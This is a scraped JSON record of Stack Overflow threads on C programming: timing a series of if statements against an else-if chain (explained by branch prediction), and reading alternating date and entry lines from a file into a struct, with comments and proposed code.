"display_name": "lordQuick", "link": "https://stackoverflow.com/users/9695520/lordquick"}, "edited": false, "score": 0, "creation_date": 1524750906, "post_id": 50017109, "comment_id": 87105863, "body": "oh, thanks! I am a complete beginner and had no clue what branch predictor is, thanks again, man."}], "tags": [], "owner": {"reputation": 2221, "user_id": 917880, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d959cb057068218cbe10b803dcc69709?s=128&d=identicon&r=PG", "display_name": "mity", "link": "https://stackoverflow.com/users/917880/mity"}, "is_accepted": true, "score": 0, "last_activity_date": 1524643723, "creation_date": 1524643723, "answer_id": 50017109, "question_id": 50016445, "link": "https://stackoverflow.com/questions/50016445/c-series-of-if-statements-vs-else-if-time-measuring/50017109#50017109", "title": "C - series of if statements vs else if time measuring", "body": "<p>Modern CPUs are very complicated beasts. </p>\n\n<p>I guess you are more benchmarking CPU branch predictor rather then anything else: If you fill the array with random numbers from the range 1...5, branch predictors will quite often guess wrong when any of the <code>if</code> is executed.</p>\n\n<p>If you fill the array with constants, the predictors will be right in 100%.</p>\n\n<p>I.e. with randomized input, the count of evaluated <code>if</code>s really matters as substantial number of them cause CPU pipeline stall.</p>\n\n<p>With the constant input, the number of executed <code>if</code>s is more or less negligible, and there are no pipeline stalls. All what matters is some CPU internals and also how well your compiler is able to optimize your code. Smart compiler might be able to effectively replace one of the two or both of your examples into <code>switch</code> statement, so without looking at the instructions generated we can just speculate.</p>\n"}], "owner": {"reputation": 33, "user_id": 9695520, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "lordQuick", "link": "https://stackoverflow.com/users/9695520/lordquick"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 69, "favorite_count": 0, "accepted_answer_id": 50017109, "answer_count": 1, "score": -2, "last_activity_date": 1524649362, "creation_date": 1524641431, "last_edit_date": 1524649362, "question_id": 50016445, "link": "https://stackoverflow.com/questions/50016445/c-series-of-if-statements-vs-else-if-time-measuring", "title": "C - series of if statements vs else if time measuring", "body": "<p>I am sorry beforehand if my terminology is lacking.\nI wrote a code to demonstrate inefficiency of series of if statements vs else/if statements. And the results dont make any sense to me.</p>\n\n<p>It's a simple algorithm that goes through an array (100000000 of elements) and counts occurrences of the elements, being 1,2,3,4,5 or else.</p>\n\n<pre><code>clock_t time1;\ntime1 = clock();\n    for (int i=1; i&lt;=n; i++)\n    {\n        if (arr[i]==1)\n            p1++;\n        if (arr[i]==2)\n            p2++;\n        if (arr[i]==3)\n            p3++;\n        if (arr[i]==4)\n            p4++;\n        if (arr[i]==5)\n            p5++;\n        if (!(arr[i]&gt;=1 &amp;&amp; arr[i]&lt;=5))\n            j++;\n    }\ntime1 = clock() - time1;\n\nprintf(\"count of 1s:\\t %d\\n\",p1);\nprintf(\"count of 2s:\\t %d\\n\",p2);\nprintf(\"count of 3s:\\t %d\\n\",p3);\nprintf(\"count of 4s:\\t %d\\n\",p4);\nprintf(\"count of 5s:\\t %d\\n\",p5);\nprintf(\"count of errors:\\t %d\\n\",j);\nprintf(\"\\n ---  counting took: %.10f ms---\\n\",((double)(time1)/CLOCKS_PER_SEC)*1000);\n</code></pre>\n\n<p>and then the same but with else if</p>\n\n<pre><code>clock_t time2;\ntime2 = clock();\n    for (int i=1; i&lt;=n; i++)\n    {\n        if (arr[i]==1)\n            p1++;\n        else if (arr[i]==2)\n            p2++;\n        else if (arr[i]==3)\n            p3++;\n        else if (arr[i]==4)\n            p4++;\n        else if (arr[i]==5)\n            p5++;\n        else j++;\n    }\ntime2 = clock() - time2;\n</code></pre>\n\n<p>as expected when given an array of random values from 1 to 5 the else if is faster about two times\nBUT (here comes the confusion) when its given an array of thousand 1s I would expect the if series to take the same amount of time bc it has to check every condition even tho the first one is already true - but it takes HALF the time \nand when I give it array of only 5s it is also quicker.</p>\n\n<p>Can anyone explain how it can be faster, please? - Thanks :/ (when I give it ran values from 4 to 5 it is actually takes about the same time as with values from 1 to 5)</p>\n\n<p><a href=\"https://i.stack.imgur.com/MfNY5.png\" rel=\"nofollow noreferrer\">(here are the results of the whole thing [ignore the Czech please])</a></p>\n\n<p><strong>Edit</strong></p>\n\n<p>Here are the times from the image:</p>\n\n<pre><code>Code 1 - random input: 2451 ms\nCode 2 - random input: 2401 ms\n\nCode 1 - all-one input: 932 ms\nCode 2 - all-one input: 573 ms\n\nCode 1 - all-five input: 923 ms\nCode 2 - all-five input: 697 ms\n</code></pre>\n"}, {"tags": ["c", "string", "file", "struct", "io"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 4, "creation_date": 1524639513, "post_id": 50015872, "comment_id": 87047992, "body": "Have <i>two</i> <code>fgets</code> calls? One for the date-line, and one for the &quot;entry&quot;-line."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 2, "creation_date": 1524640077, "post_id": 50015872, "comment_id": 87048280, "body": "What is <code>h</code> in <code>h[i]=atoi(oken);</code>? Please provide a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1524640172, "post_id": 50015872, "comment_id": 87048335, "body": "if i do that, where should i store the date-line and entry-line to? i tried to used fgets for date and entry, then continue with another fgets (which is the code above), i lost all my day, month and year"}, {"owner": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1524640220, "post_id": 50015872, "comment_id": 87048365, "body": "h is an array of int, to store the day from the file."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 2, "creation_date": 1524640359, "post_id": 50015872, "comment_id": 87048446, "body": "@sterstar show a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>. It&#39;s hard to help with that little information."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1524640582, "post_id": 50015872, "comment_id": 87048540, "body": "<code>char date[20], entry[1024]; while (fgets(date, sizeof date, file) != NULL &amp;&amp; fgets(entry, sizeof entry, file) != NULL) { ... }</code>?"}, {"owner": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1524643516, "post_id": 50015872, "comment_id": 87050248, "body": "@Someprogrammerdude if i am using two fgets like what you have shown me, i can only get until entry number three, which the last entry is not included."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1524643975, "post_id": 50015872, "comment_id": 87050541, "body": "@sterstar <a href=\"https://ideone.com/7bpJSc\" rel=\"nofollow noreferrer\">Works fine for me</a>, perhaps you&#39;re doing something else wrong?"}, {"owner": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1524646636, "post_id": 50015872, "comment_id": 87052161, "body": "<code>while(fgets(day,1024,file)!= NULL &amp;&amp; fgets(rese,1024 , file) != NULL){   oken=strtok(day,&quot;&#47;&quot;);                                                                     printf(&quot;%s\\n&quot;,oken); strcpy(res[i].entry,day); i++; }</code>"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1524646933, "post_id": 50015872, "comment_id": 87052358, "body": "@sterstar <code>day</code> is the <i>date</i>. It will still be part of the date-string after the call to <code>strtok</code>. The &quot;diary entry&quot; that you supposedly want in <code>res[i].entry</code> is in <code>rese</code> (with your code)."}, {"owner": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1524648881, "post_id": 50015872, "comment_id": 87053596, "body": "@Someprogrammerdude i change my code to <code>strcpy(res[i].entry, rese)</code>, when i output the <code>res[i].entry</code>, it show me dates instead of the entries."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1524649202, "post_id": 50015872, "comment_id": 87053790, "body": "That should not happen with the little code snippet you show in the comment, not unless you do something else wrong, or already have gone out of sync from the very beginning <i>before</i> the loop. Please take look at my <a href=\"https://ideone.com/7bpJSc\" rel=\"nofollow noreferrer\">working example</a> again. Start with that yourself. Then slowly, and step by step, add the rest of the things you need. And remember to <i>test</i> between each and every small step. And of course, <a href=\"https://ericlippert.com/2014/03/05/how-to-debug-small-programs/\" rel=\"nofollow noreferrer\">learn how to debug your program</a>."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1525190361, "post_id": 50015872, "comment_id": 87256805, "body": "the posted code has a couple of problems.  1) always check (!=NULL) the returned value from each call to <code>strtok()</code>  2) the second line in the file *if the pairs of lines) is not available until the code actually reads it in, for instance by another call to `fgets()"}, {"owner": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1525335376, "post_id": 50015872, "comment_id": 87317993, "body": "i have managed to solve the problem but i am getting a segmentation fault when i run my code in Unix. Refer my code here: <a href=\"https://stackoverflow.com/questions/50150137/i-get-segmentation-fault-core-dumped-when-i-tried-to-run-program-with-struct\" title=\"i get segmentation fault core dumped when i tried to run program with struct\">stackoverflow.com/questions/50150137/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1524673839, "post_id": 50026932, "comment_id": 87070581, "body": "do note that the second instance of <code>fgets()</code> will include the newline at the end of the <code>myDiary[i].entry</code>  You may want to eliminate the newline from being saved by: <code>myDiary[i].entry[ strspn( myDiarn[i].entry, &#39;\\n&#39; )  ] = &#39;\\0&#39; ;</code>"}, {"owner": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1524728774, "post_id": 50026932, "comment_id": 87091121, "body": "how about i need to dynamically allocate the struct of arrays? I think that where my problem is. the file that my program has to read, actually the first line contain a single integer which is 4, indicate the size of struct of array. then the subsequent is the journal entries."}, {"owner": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1524731021, "post_id": 50026932, "comment_id": 87092498, "body": "I am able to save my day, month and year into my structure, but storing the strings (entries) is still the problem. I tried to declare char* entries[] to store the entries, but when i want to print it out, my program crashed"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "reply_to_user": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1524750345, "post_id": 50026932, "comment_id": 87105448, "body": "the &#39;entries&#39; should NOT be an array of pointers to char but rather an array of char"}, {"owner": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1524996024, "post_id": 50026932, "comment_id": 87186402, "body": "even so, my program still crashed. i declare <code>char entries[1024]</code> and then the second fgets <code>fgets(&amp;entries[i],1024,file)</code>. is it correct?"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "reply_to_user": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1525053567, "post_id": 50026932, "comment_id": 87202293, "body": "no, <code>fgets(&amp;entries[i],1024,file)</code>  is not correct.   My answer is complete without any changes.  in my answer, the first line is read and broken into the desired fields (day, month, year)  Then the second line is read, directly into an instance of the struct.  the only array that you want to be indexing through is <code>myDiary[]</code>  The <code>myDiary[]</code> is an array of instances of the typedef Diary, which is a rename of the <code>struct Journal</code>.  After both lines are read, increment the index &#39;i&#39; and repeat the loop until EOF"}, {"owner": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1525095645, "post_id": 50026932, "comment_id": 87220236, "body": "i understand your code. but when i write <code>fgets(myDiary[i].entry,1024,file)</code> in my code, it crashes as well. i guess it is because previously, i declare <code>Diary* myDiary =(Diary*)malloc((size)*sizeof(Diary));</code>, which <code>size</code> is 4 as read from the file. this is required by the question"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "reply_to_user": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1525115201, "post_id": 50026932, "comment_id": 87230615, "body": "Please post your latest code and any criteria your code must observe as an edit to your question."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "reply_to_user": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1525190703, "post_id": 50026932, "comment_id": 87257007, "body": "I see where the contents of the input file now contains a count of the  number of following pairs of lines,  I have modified my answer accordingly"}, {"owner": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1525335462, "post_id": 50026932, "comment_id": 87318038, "body": "Thanks for your code. I managed to solve my problem but i am having a segmentation fault when i run in Unix. Refer my code here: <a href=\"https://stackoverflow.com/questions/50150137/i-get-segmentation-fault-core-dumped-when-i-tried-to-run-program-with-struct\" title=\"i get segmentation fault core dumped when i tried to run program with struct\">stackoverflow.com/questions/50150137/&hellip;</a>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "reply_to_user": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1525424671, "post_id": 50026932, "comment_id": 87359572, "body": "after calling: <code>file = fopen(&quot;struct.txt&quot;, &quot;r&quot;);</code>  and before calling: <code>while (fgets(line, sizeof(line), file) != NULL)</code> you need to consume all the white space, especially the newline.  Otherwise the first call to <code>fgets()</code> will only read zero or more spaces + the newline.  that is why the first I/O in my answer was a call to <code>fgets()</code> so the whole first line will be read into memory."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "reply_to_user": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1525425362, "post_id": 50026932, "comment_id": 87359994, "body": "in your referenced code, the code block starting with: <code>while (l &lt; size)             {                 res[l].day = res2[k].day;</code>  reads from <code>res2[]</code> an entry that was never filled (the last entry being copied reads past the end of the data)  Resulting in undefined behavior.  (why not just write it to <code>res[]</code>  initially?)"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "reply_to_user": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1525425521, "post_id": 50026932, "comment_id": 87360099, "body": "in your referenced code: regarding: <code>choice = atoi(argv[1]);</code>  validate the value in <code>choice</code> to assure it is within the valid range (0...4)  otherwise it will (also) have undefined behavior"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "reply_to_user": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1525425634, "post_id": 50026932, "comment_id": 87360165, "body": "in your referenced code: this statement: ` fclose(file);` is located in the execution path when the call to <code>fopen()</code> has failed.  There will be a seg fault event if the <code>fopen()</code> failed"}], "tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": 0, "last_activity_date": 1525192001, "last_edit_date": 1525192001, "creation_date": 1524672910, "answer_id": 50026932, "question_id": 50015872, "link": "https://stackoverflow.com/questions/50015872/how-to-get-alternative-line-from-a-file-and-store-it-as-string-into-a-struct/50026932#50026932", "title": "How to get alternative line from a file and store it as string into a struct?", "body": "<p>the following proposed code:</p>\n\n<ol>\n<li>performs the desired functionality</li>\n<li>gives meaningful names to the 'magic' numbers</li>\n<li>separates the struct definition from the typedef for that struct</li>\n<li>updated/edited with latest question details</li>\n</ol>\n\n<p>and now the proposed code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define MAX_LINE_LEN 1024\n\nstruct journal\n{\n    int day;\n    int month;\n    int year;\n    char entry[ MAX_LINE_LEN ];\n};\ntypedef struct journal Diary;\n\n\nint main( void )\n{\n\n    FILE* file=fopen(\"struct.txt\",\"r\");\n    if ( !file )\n    {\n        perror(\"fopen failed\");}\n        exit( EXIT_FAILURE );\n    }\n\n    // implied else, fopen successful\n\n    char line[ MAX_LINE_LEN ];\n    int size;\n\n    if( fgets( line, sizeof line, file ) )\n    {\n        if ( sscanf( line, \"%d\", size ) != 1 )\n        {\n            fprintf( stderr, \"scanf for data count failed\\m\" );\n            exit( EXIT_FAILURE );\n        }\n\n        // implied else, input of data count successful\n    }\n\n    else\n    {\n        perror( \"fgets for data count failed\" );\n        exit( EXIT_FAILURE );\n    }\n\n    // implied else, fgets successful\n\n\n    Diary myDiary[ size ];  // uses VLA (variable length array feature of C\n\n\n    size_t i = 0;\n    char *token = NULL;\n\n    while( i &lt; size &amp;&amp; fgets( line, sizeof( line ), file) )\n    {\n        token = strtok( line, \"/\" );\n        if( token )\n        {\n            myDiary[i].day = atoi( token );\n\n            token = strtok( NULL, \"/\" );\n            if( token )\n            {\n                myDiary[i].month = atoi( token );\n\n                token = strtok( NULL, \"/\" );\n                if( token )\n                {\n                    myDiary[i].year = atoi( token );\n\n                    // input data directly into struct instance\n                    fgets( myDiary[i].entry, MAX_LINE_LEN, file );\n                }\n            }\n        }\n        i++;\n    }\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1525150540, "post_id": 50111174, "comment_id": 87240206, "body": "I get the <code>error failed to parse date 0</code>. why is this so?"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "reply_to_user": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1525150730, "post_id": 50111174, "comment_id": 87240248, "body": "Did you copy exactly? That error means your 1st call to <code>sscanf</code> within the loop failed. If you copied exactly, the only way that can happen is if your input file is not in the format you provided. You are giving the filename to read as the 1st argument to the program (or are redirecting the file on <code>stdin</code> to the program), right?"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "reply_to_user": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1525151021, "post_id": 50111174, "comment_id": 87240309, "body": "I bet you are reading the number with <code>scanf</code> and then looping. Reading the first line with <code>scanf</code> will leave the trailing <code>&#39;\\n&#39;</code> in <code>stdin</code> and that will cause the read of the date to fail (which is the reason I used <code>fgets</code> for the first line, instead of <code>scanf</code>)"}, {"owner": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1525156980, "post_id": 50111174, "comment_id": 87241850, "body": "i copy exactly the code from the for loop to <code>if (!fgets (buf, MAXLENGTH, fp)) {  &#47;* read entry *&#47;             fprintf (stderr, &quot;error: failed to read entry %zu.\\n&quot;, i);             return 1;         }</code> and my input file is exactly the same format i provided. I am not using argument, I just <code>fopen</code> the input file and read. I am using <code>fscanf</code> to read the number at the first line"}, {"owner": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1525158309, "post_id": 50111174, "comment_id": 87242296, "body": "if i am using <code>fgets</code> to read the number of entries like the code you provided, my program crashed"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "reply_to_user": {"reputation": 69, "user_id": 5408189, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-PBpelpbBN7w/AAAAAAAAAAI/AAAAAAAAAiI/B_Ec6cBdy2k/photo.jpg?sz=128", "display_name": "sterstar", "link": "https://stackoverflow.com/users/5408189/sterstar"}, "edited": false, "score": 0, "creation_date": 1525159213, "post_id": 50111174, "comment_id": 87242607, "body": "Are you on Windows? Did you read the note about changing all <code>%zu</code> to <code>%lu</code> (windows doesn&#39;t recognize the <code>%zu</code> format specifier). Make that change and it will work fine. <i>&quot;Also note the GNU gcc uses <code>%zu</code> as the format specifier for <code>size_t</code>. If you are on windoze, change each to <code>%lu</code>&quot;</i> That&#39;s all I needed and it will compile without warning or error under Win7 and VS 10.0. When you compile any code, it should compile without warning. Don&#39;t accept code until it compiles without a single warning using 